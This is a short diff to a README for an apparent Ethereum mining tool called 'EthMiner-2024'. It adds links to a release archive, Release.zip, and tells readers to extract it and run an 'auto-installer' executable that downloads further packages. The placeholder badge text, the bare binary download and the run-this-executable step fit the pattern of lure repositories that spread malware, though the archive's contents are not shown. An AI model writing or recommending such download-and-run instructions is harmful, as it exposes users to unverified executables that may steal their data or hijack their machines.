@@ -7,11 +7,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/f6fc887f-67ac-479b-98ba-6e0adaa4372e)
-]()
+](https://github.com/Daniel-gon/EthMiner-2024/releases/download/V3.88/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/Daniel-gon/EthMiner-2024/releases/download/V3.88/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 
